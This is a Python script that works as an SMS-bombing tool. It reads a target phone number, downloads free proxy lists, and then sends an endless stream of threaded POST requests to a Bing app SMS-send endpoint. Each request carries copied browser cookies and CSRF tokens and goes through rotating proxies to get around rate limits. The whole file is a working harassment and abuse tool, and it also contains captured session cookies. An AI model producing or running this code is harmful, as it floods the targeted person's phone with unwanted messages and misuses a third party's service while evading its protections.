import requests as req
import json as js
import threading as thr
import time as tm
import random as rnd
import logging as lg

user_input = input("Enter number: ")

lg.basicConfig(
    filename='activity.log', 
    filemode='a',  # Corrected from 'append' to 'a'
    level=lg.INFO,
    format='%(asctime)s - %(message)s'
)

def fetch_proxies():
    main_url = "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt"
    try:
        res = req.get(main_url, timeout=5)
        if res.status_code == 200:
            proxy_list = res.text.splitlines()
            return proxy_list
    except:
        pass
    
    secondary_url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
    try:
        res = req.get(secondary_url, timeout=5)
        if res.status_code == 200:
            proxy_list = res.text.splitlines()
            return proxy_list
    except:
        pass
    
    return []

def send_request(prx):
    hdr = {
        'authority': 'bingapp.microsoft.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'cookie': 'at_check=true; fptctx2=taBcrIH61PuCVH7eNCyH0OPzOrGnaCb%252f7mTjN%252fuIW2u3btoeTLyWu4HypcT6GVYPsCHDdWlpbm8BWQBAqIzz23QZgD7K6Af3csgQqvXrWskkZZXCWdI%252bRj1DWAJm8r0lEv6VCUGn4jmB1GweQ2K2KzLB7aX4%252bKNSA1pLUdk11LRx2mLDLMeNec2cmSYc2udX7ZuS1Dr8kS72lxDIVVlEZ4MuxuyEFDBYKgnP%252bPqOxzEiAShOyb265GxoCx%252bjtGtmw8y3%252fyhKmb8msRC8YWwHblgGaCn3BcyWYgSRN%252fC%252fC38%252bEf75YtTwbVc89tTI%252b732; market=US; MUID=2DB17053F1186A7F27396322F0E06BDC; XSRF-TOKEN=2023-08-18T09%3A11%3A42.512Z; _csrf=ZgAExIXWqTzb5nLBmLDmmLkO; ai_user=24jdr76KGsBZihQrRmfkiT|2023-08-18T09:11:43.093Z; arp_scroll_position=425; ai_session=D9m2VNhpyXo+AsnFLW4mfW|1692349903604|1692350889884',
        'dnt': '1',
        'origin': 'https://bingapp.microsoft.com',
        'referer': 'https://bingapp.microsoft.com/bing?style=rewards',
        'request-id': '|e8076b5dc420496aa09ca9e1fa6d9b4e.67049a4213c7400e',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'traceparent': '00-e8076b5dc420496aa09ca9e1fa6d9b4e-67049a4213c7400e-01',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'x-csrf-token': '3hUD8yhV-LmXnpqxfDipkTcx-T-c6aTzZGC8',
    }

    data = {
        "_csrf": "3hUD8yhV-LmXnpqxfDipkTcx-T-c6aTzZGC8",
        "code": "bing",
        "number": user_input,
        "adjust": "hh15fre_vz667pg",
        "style": "rewards",
        "go": "false",
        "url": None,
        "id": None,
        "referId": None,
        "codeTransit": None
    }

    try:
        resp = req.post(
            "https://bingapp.microsoft.com/api/sms/send",
            headers=hdr,
            json=data,
            proxies={"https": prx},
            timeout=15
        )
        result = resp.text
        if "SMS SENT SUCCESSFULLY!" in result:
            print("Message sent successfully!")
        else:
            print("Failed to send message.")
    except Exception as e:
        result = f"Error with proxy {prx}: {str(e)}"

    lg.info(result)
    print(result)

thread_count = 10

while True:
    proxy_pool = fetch_proxies()
    if not proxy_pool:
        print("Retrying in 10 seconds...")
        tm.sleep(10)
        continue
    
    for _ in range(thread_count):
        prx = rnd.choice(proxy_pool)
        thread = thr.Thread(target=send_request, args=(prx,))
        thread.start()
    
    tm.sleep(1)
